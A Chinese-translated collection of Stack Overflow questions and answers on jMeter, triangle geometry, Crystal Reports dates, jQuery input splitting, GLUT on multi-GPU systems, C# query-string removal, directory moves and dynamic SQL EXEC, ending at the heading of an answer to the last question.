> 时间：2012-06-15T16:33:35.343

首先，我建议升级到最新版本的 jMeter。

要开始每个测试，您应该添加一个线程组（右键单击测试计划）：

![在此处输入图像描述](../Images/cd6a7876b3e9726207089fa6d4db69d0.png)

然后，您可以通过单击您的线程组并填写线程数字段来将用户/线程数指定为 25。

由于您正在处理网络，您将向您的线程组添加一个 http 请求（我的屏幕截图中有更多采样器不要混淆，这是因为可以使用您真正需要的任何东西扩展 jmeter）：

![在此处输入图像描述](../Images/ee24bc744e28d5bfbaa9617a7c4eefd1.png)

然后在做一些 web 请求之后，你将使用 ie response assertion 来验证这些 web 请求：

![在此处输入图像描述](../Images/d74a42e820a7f1b2e1eaf0311b34f108.png)

我真的可以坚持很长时间。在我看来，Jmeter 文档有些差，但它是一个很棒的工具。

没有任何具体问题，这应该足以让您入门。

# math - 如何计算三角形（2D）中第三点的坐标，知道2点坐标，所有长度和所有角度

> ID：11052720
> 
> 赞同：0
> 
> 时间：2012-06-15T14:31:54.780
> 
> 标签：math, geometry, coordinates

我有一个三角形，我知道两个顶点的坐标：A=(x1,y1),B=(x2,y2) 所有角度：ABC=90∘,CAB=30∘ 和 BCA=60∘ 以及所有边长度。如何找到第三个顶点 C=(x3,y3) 的坐标？

我知道有两种解决方案（我都想要）。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-15T15:14:48.797

1.  你知道 p1 和 p2。你知道内角。
2.  从 p1 到 p2 发出一条射线，并围绕 p1 顺时针或逆时针旋转 30°。
3.  通过 p1 和 p2 画一条线，并围绕 p2 旋转 90°。
4.  计算交叉点。

你得到积分：

```
x3 = x2 + s*(y1 - y2)
y3 = y2 + s*(x2 - x1) 
```

和

```
x3 = x2 + s*(y2 - y1)
y3 = y2 + s*(x1 - x2) 
```

在哪里`s = 1/sqrt(3) ≈ 0.577350269`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-15T14:40:05.483

在 30-60-90 直角三角形中，最小的腿（与 90 度角相邻的最小边）的长度是斜边（与 90 度角相对的边）的 1/2，所以既然你有边长，你可以确定哪条腿是线段AB。

从中您可以推断出角度的去向。

然后要计算坐标，您只需要在正确的角度以正确的半径长度选择半径圆上的点。

两种解决方案来自顺时针或逆时针测量角度，并产生对称三角形，边 AB 是对称线。

由于您已经给出了角度，因此通过二次公式计算 AB 的长度

L(AB) = Sqrt[(x1-x2)^2 + (y1-y2)^2]。

现在，让 x = L(AC) = 2*L(BC) 所以因为它是直角三角形，

L(AC)^2 = L(BC)^2 + L(AB)^2，

x^2 = (0.5x)^2 + L(AB)^2，所以 L(AB) = x*Sqrt[3]/2，因为你已经计算了 L(AB)，你现在有了 x。

原始 AB 的角度为 a = arctan([y2-y1]/[x2-x1])。现在您可以向上或向下测量 30 度（根据需要使用 a+30 或 a-30）并以角度 a +/- 标记半径 x（我们在上面计算）的圆（以 A 为中心）上的点 C 30.

那么，C有坐标

x3 = x1 + x*cos(a+30)

y3 = y1 + x*sin(a+30)

或者您可以使用 (a-30) 来获得对称三角形。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2015-10-14T03:12:31.840

如果提供两个点和边数作为输入，这是返回完整多边形点的代码。这是为 Android(Java) 编写的，逻辑可以重用于其他语言

```
private static final float angleBetweenPoints(PointF a, PointF b) {
    float deltaY = b.y - a.y;
    float deltaX = b.x - a.x;
    return (float) (Math.atan2(deltaY, deltaX));

}
private static PointF pullPointReferenceToLineWithAngle(PointF a, PointF b,
        float angle) {

    float angleBetween = angleBetweenPoints(b, a);
    float distance = (float) Math.hypot(b.x - a.x, b.y - a.y);
    float x = (float) (b.x + (distance * Math.cos((angleBetween + angle))));
    float y = (float) (b.y + (distance * Math.sin((angleBetween + angle))));
    return new PointF(x, y);
}

private static List<PointF> pullPolygonPointsFromBasePoints(PointF a,
        PointF b, int noOfSides) {
    List<PointF> points = new ArrayList<>();
    points.add(a);
    points.add(b);
    if (noOfSides < 3) {
        return points;
    }
    float angleBetweenTwoSides = (float) ((((noOfSides - 2) * 180) / noOfSides)
            * Math.PI / 180);
    for (int i = 3; i <= noOfSides; i++) {
        PointF nextPoint = pullPointReferenceToLineWithAngle(
                points.get(i - 3), points.get(i - 2), angleBetweenTwoSides);
        points.add(nextPoint);
    }
    return points;
} 
```

**用法是onDraw方法：**

```
PointF a = new PointF(100, 600);
    PointF b = new PointF(300, 500);
    int noOfSides = 3;

    List<PointF> polygonPoints = pullPolygonPointsFromBasePoints(a, b,
            noOfSides);

    drawPolyPoints(canvas, noOfSides, polygonPoints); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-15T14:40:21.927

这是一个直角三角形。角 ABC 是 90 度，所以计算连接 A 到 B 的向量并将其称为 AA 并对其进行归一化：

```
 AA = (x2-x1,y2-y1) / |(x2-x1,y2-y1)| 
```

垂直于的单位向量`AA`由下式给出

```
 BB = (-(y2-y1),x2-x1) / |(x2-x1,y2-y1)| 
```

因为 AC 垂直于 AB，所以你可以得到你的第一个`P1`点

```
 P1 = (x2,y2) + K * BB 
```

其中 K 是等于边 AC 长度的标量值（您说您在问题中已经知道）。然后，您的第二个解决方案点`P2`只需朝负`BB`方向移动即可

```
 P2 = (x2,y2) - K * BB 
```

# sql-server-2005 - Crystal 报表在使用日期范围时返回零

> ID：11052723
> 
> 赞同：0
> 
> 时间：2012-06-15T14:31:58.053
> 
> 标签：sql-server-2005, date-format, crystal-reports-2008

我正在创建一个水晶报表，它将显示一些计数。只要我不使用日期参数来缩小结果范围，它就可以正常工作。当我尝试使用日期时，我的报告对所有计数都返回 0。

该报告使用具有以下 SQL 的命令对象（经过混淆处理，但语法相同）。

```
SELECT 
(SELECT COUNT(*) FROM REPORT_ WHERE DATE_SUBMITTED IS NOT NULL) AS SUBMITTED,
(SELECT COUNT(*) FROM REPORT_ WHERE DATE_RECEIVED BETWEEN {?StartDate} AND {?EndDate}) AS TOTALRECEIVED,
(SELECT COUNT(*) FROM REPORT_ WHERE DATE_RECEIVED BETWEEN {?StartDate} AND {?EndDate} AND STATUS_ LIKE 'A1') AS A1,
(SELECT COUNT(*) FROM REPORT_ WHERE DATE_RECEIVED BETWEEN {?StartDate} AND {?EndDate} AND STATUS_ LIKE 'A2') AS A2,
(SELECT COUNT(*) FROM REPORT_ WHERE DATE_RECEIVED BETWEEN {?StartDate} AND {?EndDate} AND STATUS_ LIKE 'A3') AS A3,
(SELECT COUNT(*) FROM REPORT_ WHERE DATE_RECEIVED BETWEEN {?StartDate} AND {?EndDate} AND STATUS_ LIKE 'A4') AS A4,
(SELECT COUNT(*) FROM REPORT_ WHERE DATE_RECEIVED BETWEEN {?StartDate} AND {?EndDate} AND STATUS_ LIKE 'A5') AS A5,
(SELECT COUNT(*) FROM REPORT_ WHERE DATE_RECEIVED BETWEEN {?StartDate} AND {?EndDate} AND STATUS_ LIKE 'OTHER') AS OTHER 
```

如果我用命令本身中的静态值替换参数，它会完美运行......但是我使用日期参数所做的任何尝试都会导致它失败。我认为水晶报告提供的日期可能是ms sql server可以理解的格式。我试过铸造，但似乎没有任何效果。我怎样才能让我的日期参数工作？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T15:14:19.097

我终于想出了如何解决这个问题......这是人为错误。当提示输入参数的新值时，它以某种方式决定先询问结束日期，然后询问开始日期。我输入了错误的值，导致日期范围为空。我重新排列了参数请求，并输入了正确的值，并且它起作用了。

我有点惭愧，我花了这么长时间才解决，但我想我会发布这个，万一有人遇到了类似的问题。

# jquery - 提交前在另一个 div 中显示的逗号分隔输入

> ID：11052727
> 
> 赞同：1
> 
> 时间：2012-06-15T14:32:15.317
> 
> 标签：jquery

我试图允许用户在输入字段中输入多个用逗号分隔的 id #。`<li>`然后我想接受该输入，在提交之前用逗号分隔数据并将它们插入单独的标签以显示在另一个 div 中（用于验证目的）。这是我到目前为止所拥有的……请保持温和……我以前不必这样做。

```
if ($("#" + prodID).find("input.text").val() == value) {
   $("#" + prodID).find("input.text").val("");
} 
```

这是我到目前为止的地方，不知道从那里去哪里。我相信我需要添加`replaceWith()`到末尾，`.val("");`但不确定。如果有示例我可以查看，我相信我可以解决这个问题。

非常感谢任何帮助。

这是HTML。（对不起，我一开始错过了）

```
<div id="selCodes">
<p>Your selected codes <span><a href="#">Clear</a></span></p>
  <ul>
      <li><!--inserted by clicking "okay"-->
          Some Account - 0123<a href="#" title="delete"><img alt="delete" src="imgs/delete.png"></a>
      </li>
  </ul>
  <button id="subCodes">Submit</button>
</div><!-- /#my-selections -->

<h4>Narrow results by</h4>

<div id="prodId">
  <a href="#">Item code</a>
    <span><a href="#">Clear</a></span>        
    <p>Choose item from dropdown. Type code or codes, (separated by comma), and click the add button to create filters.</p>
        <select id="code-type">
            <option>Prod code</option>
            <option selected="selected">Prod UPC</option>
            <option>Master UPC</option>
            <option>CC</option>
        </select>            
        <input type="text" value="" />  
        <button>OK</button>
</div> 
```

我有一种有趣的感觉，我离基地很远。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-15T15:13:02.427

这是[演示](http://jsfiddle.net/nta5Y/)

这是代码：

```
$('#separate').on('keyup',function(){
   var splitter = $('#separate').val().split(',');  
   var htmlToAdd='';
   for (i=0; i<splitter.length; i++)
   {
       htmlToAdd += '<li>'+splitter[i]+'</li>';
   }
   $('#results').html(htmlToAdd);
});​ 
```

我在我的演示中使用了你的 html，稍作修改，在输入框中添加了一个 id，并在底部添加了一个验证结果 div。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-15T14:43:52.733

您可以使用属性匹配而`[value=somevalue]`
不是写这个

```
if ($("#" + prodID).find("input.text").val() == value) {
    $("#" + prodID).find("input.text").val("");
} 
```

`$("#" + proID + " input:text[value="+value+"]").val('');`

[在此处](http://jsfiddle.net/ranganadh/vjq4w/)查看示例

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-15T14:44:28.997

这假设您想在输入值更改时随时更新，并且您的验证`ul`的 id 为`verify`：

```
$('#'+prodId).find('input:text').change(function(e){
   var $this = $(this),
       value = $this.val(),
       values,
       $verify = $('ul#verify'),
       verifyHTML = '';
   if(value) {
       if (value.indexOf(',') != -1) {
         values = value.split(',');
       } else {
         values = [value];
       }

       for (var i = 0; i < values.length; i++) {
         verifyHTML += '<li>'+values[i]+'</li>';
       }

       $verify.html(verifyHTML);
   }
}); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-15T14:44:43.323

我从问题中的文本中假设您的意思是这样的（这里没有检查仅显示值-我可能与您的要求相去甚远）->

```
$(function() {
    $('input[type=button]').click(function() {
        var inputs_to_check = $('#check').val();
        var array_to_check = inputs_to_check.split(',');
        $.each(array_to_check,function(index,value) {
            $('#output').append('<li>' + value + " = " + $('#'+value).val() + "</li>");
        })
    });
});​ 
```

这从`input`( ) 中获取一些文本 - 其中包含要检查的s元素`#check`的逗号分隔列表。然后它拆分值并在它们上循环（），然后创建包含检查的元素及其（）`id``input``$.each()``li``id``input``value``.val()`

HTML 看起来像这样：

```
inputs :<br>
<input id="test1" value="1234"/><br>
<input id="test2" value="5678"/><br>
Output to check : <input id="check"/> <input type="button" value="check"/>
<div>
    <ul id="output"></ul>
</div>​ 
```

[这里的工作示例](http://jsfiddle.net/manseuk/XXnNC/)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-06-15T14:55:09.487

不确定这是否是您的意思：

[**演示**](http://jsfiddle.net/7WcAg/)

html:

```
<input id="input1" />
<ul id="ul1"></ul>​ 
```

jQuery：

```
$('#input1').on('keyup', function() {
    var textIn = $(this).val();
    var idArr = textIn.split(',');
    $('li', '#ul1').remove();
    $.each(idArr, function(i) {
        $('#ul1').append('<li>' + idArr[i] + '</li>');
    });
});​ 
```

# opengl - 多 GPU 系统上的 glutCreateWindow

> ID：11052730
> 
> 赞同：1
> 
> 时间：2012-06-15T14:32:20.050
> 
> 标签：opengl, glut, freeglut, glew

我`GLUT`用来创建窗口（`glutCreateWindow()`）。似乎 glut 总是在监视器中创建窗口，该窗口在 Windows 中设置为 MAIN。在我的系统中有两个 GPU。

是否可以设置哪个监视器，resp。哪个 GPU 用于创建窗口？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-15T02:32:46.667

在 Mac 上，您可以使用 CGLSetVirtualScreen(CGLCurrentContext(),x); 其中 x 是 0、1 或 2（通常是 GPU 1、GPU 2 和 Apple 软件）。但是，您可能必须在应用程序的 Info.plist 文件中添加一个标志，以启用多 GPU 支持才能正常工作。请参阅[http://developer.apple.com/library/mac/#qa/qa1734/_index.html#//apple_ref/doc/uid/DTS40010791](http://developer.apple.com/library/mac/#qa/qa1734/_index.html#//apple_ref/doc/uid/DTS40010791)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-15T15:26:23.163

不是[股票](http://www.opengl.org/resources/libraries/glut/spec3/spec3.html)GLUT 实施。

# facebook - 如何使用restfb java api注册新的游戏成就？

> ID：11052733
> 
> 赞同：0
> 
> 时间：2012-06-15T14:32:24.467
> 
> 标签：facebook, facebook-graph-api, restfb

我看到游戏成就不是图书馆支持的对象之一。是否有一种通用的方法来发布其他不受支持的对象类型？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-15T16:31:02.863

使用支持的 SDK 或直接通过 HTTP 调用使用 API 的一般含义？

PHP SDK 或使用应用程序访问令牌的直接 POST`/APP_ID/achievements`将执行此操作。如果您所做的只是注册成就，您只需执行一次，因此只需通过[调试工具](https://developers.facebook.com/tools/debug)进行- 您可以通过[访问令牌工具获取应用访问令牌](https://developers.facebook.com/tools/access_token/)

# c# - 如何有效地从 URL 中通过 Key 删除查询字符串？

> ID：11052744
> 
> 赞同：39
> 
> 时间：2012-06-15T14:32:51.237
> 
> 标签：c#, .net, regex, url, query-string

如何通过键从 URL 中删除查询字符串？

我有以下方法可以正常工作，但只是想知道有没有更好/更短的方法？还是可以更有效地执行此操作的内置 .NET 方法？

```
 public static string RemoveQueryStringByKey(string url, string key)
        {
            var indexOfQuestionMark = url.IndexOf("?");
            if (indexOfQuestionMark == -1)
            {
                return url;
            }

            var result = url.Substring(0, indexOfQuestionMark);
            var queryStrings = url.Substring(indexOfQuestionMark + 1);
            var queryStringParts = queryStrings.Split(new [] {'&'});
            var isFirstAdded = false;

            for (int index = 0; index <queryStringParts.Length; index++)
            {
                var keyValue = queryStringParts[index].Split(new char[] { '=' });
                if (keyValue[0] == key)
                {
                    continue;
                }

                if (!isFirstAdded)
                {
                    result += "?";
                    isFirstAdded = true;
                }
                else
                {
                    result += "&";
                }

                result += queryStringParts[index];
            }

            return result;
        } 
```

例如，我可以这样称呼它：

```
 Console.WriteLine(RemoveQueryStringByKey(@"http://www.domain.com/uk_pa/PostDetail.aspx?hello=hi&xpid=4578", "xpid")); 
```

希望问题很清楚。

谢谢，

* * *

## 回答 #1

> 赞同：109
> 
> 时间：2012-06-18T09:30:51.020

这很好用：

```
public static string RemoveQueryStringByKey(string url, string key)
{                   
    var uri = new Uri(url);

    // this gets all the query string key value pairs as a collection
    var newQueryString = HttpUtility.ParseQueryString(uri.Query);

    // this removes the key if exists
    newQueryString.Remove(key);

    // this gets the page path from root without QueryString
    string pagePathWithoutQueryString = uri.GetLeftPart(UriPartial.Path);

    return newQueryString.Count > 0
        ? String.Format("{0}?{1}", pagePathWithoutQueryString, newQueryString)
        : pagePathWithoutQueryString;
} 
```

一个例子：

```
RemoveQueryStringByKey("https://www.google.co.uk/search?#hl=en&output=search&sclient=psy-ab&q=cookie", "q"); 
```

并返回：

```
https://www.google.co.uk/search?#hl=en&output=search&sclient=psy-ab 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-06-15T14:53:19.610

```
 var queryString = "hello=hi&xpid=4578";
    var qs = System.Web.HttpUtility.ParseQueryString(queryString);
    qs.Remove("xpid");
    var newQuerystring = qs.ToString(); 
```

这仍然适用于 .NET 5。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2018-06-19T17:14:32.973

在 System 命名空间中有一个名为[UriBuilder](https://msdn.microsoft.com/en-us/library/system.uribuilder(v=vs.110).aspx)的有用类。我们可以将它与几个扩展方法一起使用来执行以下操作：

```
Uri u = new Uri("http://example.com?key1=value1&key2=value2");
u = u.DropQueryItem("key1"); 
```

或者像这样：

```
Uri u = new Uri("http://example.com?key1=value1&key2=value2");
UriBuilder b = new UriBuilder(u);
b.RemoveQueryItem("key1");
u = b.Uri; 
```

扩展方法：

```
using System;
using System.Collections.Specialized;
using System.Text;
using System.Text.RegularExpressions;

public static class UriExtensions
{
    public static Uri DropQueryItem(this Uri u, string key)
    {
        UriBuilder b = new UriBuilder(u);
        b.RemoveQueryItem(key);
        return b.Uri;
    }
}
public static class UriBuilderExtensions
{
    private static string _ParseQueryPattern = @"(?<key>[^&=]+)={0,1}(?<value>[^&]*)";
    private static Regex _ParseQueryRegex = null;

    private static Regex ParseQueryRegex
    {
        get
        {
            if (_ParseQueryRegex == null)
            {
                _ParseQueryRegex = new Regex(_ParseQueryPattern, RegexOptions.Compiled | RegexOptions.Singleline);
            }
            return _ParseQueryRegex;

        }
    }

    public static void SetQueryItem(this UriBuilder b, string key, string value)
    {
        NameValueCollection parms = ParseQueryString(b.Query);
        parms[key] = value;
        b.Query = RenderQuery(parms);
    }

    public static void RemoveQueryItem(this UriBuilder b, string key)
    {
        NameValueCollection parms = ParseQueryString(b.Query);
        parms.Remove(key);
        b.Query = RenderQuery(parms);
    }       
    private static string RenderQuery(NameValueCollection parms)
    {
        StringBuilder sb = new StringBuilder();
        for (int i=0; i<parms.Count; i++)
        {
            string key = parms.Keys[i];
            sb.Append(key + "=" + parms[key]);
            if (i < parms.Count - 1)
            {
                sb.Append("&");
            }
        }
        return sb.ToString();
    }
    public static NameValueCollection ParseQueryString(string query, bool caseSensitive = true)
    {
        NameValueCollection pairs = new NameValueCollection(caseSensitive ? StringComparer.Ordinal : StringComparer.OrdinalIgnoreCase);

        string q = query.Trim().TrimStart(new char[] {'?'});
        MatchCollection matches = ParseQueryRegex.Matches(q);

        foreach (Match m in matches)
        {
            string key = m.Groups["key"].Value;
            string value = m.Groups["value"].Value;
            if (pairs[key] != null)
            {
                pairs[key] = pairs[key] + "," + value;
            }
            else
            {
                pairs[key] = value;
            }

        }

        return pairs;

    }

} 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2017-12-20T13:51:37.400

我们也可以使用正则表达式

```
string queryString = "Default.aspx?Agent=10&Language=2"; //Request.QueryString.ToString();
string parameterToRemove="Language";   //parameter which we want to remove
string regex=string.Format("(&{0}=[^&\s]+|(?<=\?){0}=[^&\s]+&?)",parameterToRemove);   //this will not work for javascript, for javascript you can do following
string finalQS = Regex.Replace(queryString, regex, "");

//javascript(following is not js syntex, just want to give idea how we can able do it in js)
string regex1 = string.Format("(&{0}=[^&\s]+)",parameterToRemove);
string regex2 = string.Format("(\?{0}=[^&\s]+&?)",parameterToRemove);
string finalQS = Regex.Replace(queryString, regex1, "").Replace(queryString, regex2, ""); 
```

[https://regexr.com/3i9vj](https://regexr.com/3i9vj)

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2021-02-03T21:46:32.140

我知道这是一个相当古老的问题，但我读到的所有内容都感觉有点复杂。

```
public Uri GetUriWithoutQueryParam( Uri originalUri, string paramKey ) {
  NameValueCollection newQuery = HttpUtility.ParseQueryString( originalUri.Query );
  newQuery.Remove( paramKey );
  return new UriBuilder( originalUri ) { Query = newQuery.ToString() }.Uri;
} 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-06-15T14:56:51.310

这个怎么样：

```
 string RemoveQueryStringByKey(string url, string key)
    {
        string ret = string.Empty;

        int index = url.IndexOf(key);
        if (index > -1)
        {
            string post = string.Empty;

            // Find end of key's value
            int endIndex = url.IndexOf('&', index);
            if (endIndex != -1) // Last query string value?
            {
                post = url.Substring(endIndex, url.Length - endIndex);
            }

            // Decrement for ? or & character
            --index;
            ret = url.Substring(0, index) + post;
        }

        return ret;
    } 
```

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2012-06-15T15:01:15.310

我找到了一种不使用正则表达式的方法：

```
private string RemoveQueryStringByKey(string sURL, string sKey) {
    string sOutput = string.Empty;

    int iQuestion = sURL.IndexOf('?');
    if (iQuestion == -1) return (sURL);

    int iKey = sURL.Substring(iQuestion).IndexOf(sKey) + iQuestion;
    if (iKey == -1) return (sURL);

    int iNextAnd = sURL.Substring(iKey).IndexOf('&') + iKey + 1;

    if (iNextAnd == -1) {
        sOutput = sURL.Substring(0, iKey - 1);
    }
    else {
        sOutput = sURL.Remove(iKey, iNextAnd - iKey);
    }

    return (sOutput);
} 
```

我确实尝试过在最后添加另一个字段，它也可以正常工作。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2012-06-15T20:36:02.823

我在想最短的方法（我*相信*在所有情况下都会产生一个有效的 URL，假设 URL 开始是有效的）是使用这个正则表达式（`getRidOf`你试图删除的变量名在哪里）并且替换是一个零长度字符串`""`）：

```
(?<=[?&])getRidOf=[^&]*(&|$) 
```

甚至可能

```
\bgetRidOf=[^&]*(&|$) 
```

虽然可能不是绝对*最漂亮*的URL，但我*认为*它们都是有效的：

```
 INPUT                                         OUTPUT
      -----------                                   ------------
blah.com/blah.php?getRidOf=d.co&blah=foo        blah.com/blah.php?blah=foo
blah.com/blah.php?f=0&getRidOf=d.co&blah=foo    blah.com/blah.php?f=0&blah=foo
blah.com/blah.php?hello=true&getRidOf=d.co      blah.com/blah.php?hello=true&
blah.com/blah.php?getRidOf=d.co                 blah.com/blah.php? 
```

这是一个简单的正则表达式替换：

```
Dim RegexObj as Regex = New Regex("(?<=[?&])getRidOf=[^&]*(&|$)")
RegexObj.Replace("source.url.com/find.htm?replace=true&getRidOf=PLEASE!!!", "") 
```

...应该导致字符串：

```
"source.url.com/find.htm?replace=true&" 
```

...这似乎对 ASP.Net 应用程序有效，而`replace`等于`true`（不是`true&`或类似的东西）

如果您遇到无法使用的情况，我会尝试对其进行调整:)

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2014-04-22T11:31:06.883

在删除您的`QueryString`.

```
 PropertyInfo isreadonly = 
          typeof(System.Collections.Specialized.NameValueCollection).GetProperty(
          "IsReadOnly", BindingFlags.Instance | BindingFlags.NonPublic);
        // make collection editable
        isreadonly.SetValue(this.Request.QueryString, false, null);
        // remove
        this.Request.QueryString.Remove("yourKey"); 
```

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2014-08-25T15:13:19.270

```
public static string RemoveQueryStringByKey(string sURL, string sKey)
    {
        string sOutput = string.Empty;
        string sToReplace = string.Empty;

        int iFindTheKey = sURL.IndexOf(sKey);
        if (iFindTheKey == -1) return (sURL);

        int iQuestion = sURL.IndexOf('?');
        if (iQuestion == -1) return (sURL);

        string sEverythingBehindQ = sURL.Substring(iQuestion);
        List<string> everythingBehindQ = new List<string>(sEverythingBehindQ.Split('&'));
        foreach (string OneParamPair in everythingBehindQ)
        {
            int iIsKeyInThisParamPair = OneParamPair.IndexOf(sKey);
            if (iIsKeyInThisParamPair != -1)
            {
                sToReplace = "&" + OneParamPair;
            }
        }

        sOutput = sURL.Replace(sToReplace, "");
        return (sOutput);
    } 
```

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2017-02-16T09:38:03.847

抱歉，这有点脏，但应该可以在较旧的框架中使用

```
public String RemoveQueryString( String rawUrl  , String keyName)
{
    var currentURL_Split =  rawUrl.Split('&').ToList();
    currentURL_Split = currentURL_Split.Where(o => !o.ToLower().StartsWith(keyName.ToLower()+"=")).ToList();
    String New_RemovedKey = String.Join("&", currentURL_Split.ToArray()); 
    New_RemovedKey = New_RemovedKey.Replace("&&", "&");
    return New_RemovedKey;
} 
```

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2017-08-16T06:56:14.230

这是我的解决方案：

我添加了一些额外的输入验证。

```
public static void TryRemoveQueryStringByKey(ref string url, string key)
{
    if (string.IsNullOrEmpty(url) ||
        string.IsNullOrEmpty(key) ||
        Uri.IsWellFormedUriString(url, UriKind.RelativeOrAbsolute) == false)
    {
        return false;
    }            

    try
    {
        Uri uri = new Uri(url);

        // This gets all the query string key value pairs as a collection
        NameValueCollection queryCollection = HttpUtility.ParseQueryString(uri.Query);
        string keyValue = queryCollection.Get(key);

        if (url.IndexOf("&" + key + "=" + keyValue, StringComparison.OrdinalIgnoreCase) >= 0)
        {
            url = url.Replace("&" + key + "=" + keyValue, String.Empty);
            return true;
        }
        else if (url.IndexOf("?" + key + "=" + keyValue, StringComparison.OrdinalIgnoreCase) >= 0)
        {
            url = url.Replace("?" + key + "=" + keyValue, String.Empty);
            return true;
        }
        else
        {
            return false;
        }
    }
    catch
    {
        return false;
    }
} 
```

一些单元测试示例：

```
string url1 = "http://www.gmail.com?a=1&cookie=cookieValue"
Assert.IsTrue(TryRemoveQueryStringByKey(ref url1,"cookie")); //OUTPUT: "http://www.gmail.com?a=1"

string url2 = "http://www.gmail.com?cookie=cookieValue"  
Assert.IsTrue(TryRemoveQueryStringByKey(ref url2,"cookie")); //OUTPUT: "http://www.gmail.com"

string url3 = "http://www.gmail.com?cookie="  
Assert.IsTrue(TryRemoveQueryStringByKey(ref url2,"cookie")); //OUTPUT: "http://www.gmail.com" 
```

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2018-10-02T09:53:34.680

这是一个完整的解决方案，适用于 >= 0 指定的参数和任何形式的 URL：

```
 /// <summary>
    /// Given a URL in any format, return URL with specified query string param removed if it exists
    /// </summary>
    public static string StripQueryStringParam(string url, string paramToRemove)
    {
        return StripQueryStringParams(url, new List<string> {paramToRemove});
    }

    /// <summary>
    /// Given a URL in any format, return URL with specified query string params removed if it exists
    /// </summary>
    public static string StripQueryStringParams(string url, List<string> paramsToRemove)
    {
        if (paramsToRemove == null || !paramsToRemove.Any()) return url;

        var splitUrl = url.Split('?');
        if (splitUrl.Length == 1) return url;

        var urlFirstPart = splitUrl[0];
        var urlSecondPart = splitUrl[1];

        // Even though in most cases # isn't available to context,
        // we may be passing it in explicitly for helper urls
        var secondPartSplit = urlSecondPart.Split('#');
        var querystring = secondPartSplit[0];
        var hashUrlPart = string.Empty;
        if (secondPartSplit.Length > 1)
        {
            hashUrlPart = "#" + secondPartSplit[1];
        }
        var nvc = HttpUtility.ParseQueryString(querystring);
        if (!nvc.HasKeys()) return url;

        // Remove any matches
        foreach (var key in nvc.AllKeys)
        {
            if (paramsToRemove.Contains(key))
            {
                nvc.Remove(key);
            }
        }

        if (!nvc.HasKeys()) return urlFirstPart;
        return urlFirstPart + 
               "?" + string.Join("&", nvc.AllKeys.Select(c => c.ToString() + "=" + nvc[c.ToString()])) + 
               hashUrlPart;
    } 
```

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2020-11-21T23:30:56.700

这个老问题的更现代的答案，以防其他人像我一样偶然发现它。

这是使用 Uri 类来解析 URL（如果您的 URL 已经在 Uri 对象中，则可以跳过）和 LINQ 来过滤查询字符串。

```
public static string RemoveQueryStringByKey(string url, string key)
{
    var uri = new Uri(url, UriKind.Absolute);
    var queryParts = uri.Query
        .TrimStart('?')
        .Split('&')
        .Where(item => string.CompareOrdinal(item, key) != 0);
    return uri.Scheme + Uri.SchemeDelimiter
        + uri.Authority
        + uri.AbsolutePath
        + "?" + string.Join("&", queryParts);
} 
```

* * *

## 回答 #15

> 赞同：-1
> 
> 时间：2016-09-14T13:16:59.583

```
string url = HttpContext.Current.Request.Url.AbsoluteUri;
string[] separateURL = url.Split('?');

NameValueCollection queryString = System.Web.HttpUtility.ParseQueryString(separateURL[1]);
queryString.Remove("param_toremove");

string revisedurl = separateURL[0] + "?" + queryString.ToString(); 
```

# c# - 使用 C# 移动目录

> ID：11052746
> 
> 赞同：0
> 
> 时间：2012-06-15T14:32:53.357
> 
> 标签：c#, ioexception

我有一个目录`D:\AAAA\BBBB\CCCC`并使用 C# 我想将此目录移动到`D:\DDDD`.

我想要实现的结果是目录：`D:\DDDD\AAAA\BBBB\CCCC`

我正在使用以下代码行：

```
System.IO.Directory.Move("D:\\AAAA","D:\\DDDD"); 
```

但它抛出了`System.IOException`一条消息：

> 当该文件已存在时无法创建该文件。

请指导我。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-15T14:41:10.460

如果您正在寻找更像是合并到现有目录的东西，那么我认为唯一的方法是编写自己的方法来创建目录并手动移动文件（如 Tim Schmelter 的评论）。否则，如果现有目录首先存在，您可以删除它，但这似乎很危险。

[这是关于合并的SO。](https://stackoverflow.com/questions/9053564/c-sharp-merge-one-directory-with-another)答案是复制，所以如果你想要更接近移动的东西，只需为原点添加最终删除

# sql - 在 SQL 中执行 EXEC 时使用字符串中的变量值

> ID：11052749
> 
> 赞同：2
> 
> 时间：2012-06-15T14:33:04.230
> 
> 标签：sql, exec

我想在不需要创建查询本身的 exec 中使用变量值。我将在我的数据库的一个字段中存储一个查询，我只想使用该存储过程中的参数来执行它。对于下面的示例，我声明了两个变量@ValueVariable 是存储过程的参数，而我声明的@QueryString 是我将从数据库中读取的变量，我想使用@ValueVariable 的值来执行它。

```
DECLARE @ValueVariable  int=0
        @QueryString    VARCHAR(MAX)=
                        'SELECT UserName FROM TableUser WHERE UserId=@ValueVariable'

EXEC(@QueryString) 
```

当我尝试执行时，在“SELECT UserName FROM TableUser WHERE UserId=@ValueVariable”附近出现错误语法错误

我知道我可以通过

```
@QueryString    VARCHAR(MAX)=
                            'SELECT UserName FROM TableUser WHERE UserId='+@ValueVariable 
```

但我想如上所述使用它。不在我的过程中进行查询，而是使用从数据库检索到的字符串中的变量值。

那么有什么方法我可以使用当前环境中变量的值来执行它。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-15T14:42:41.573

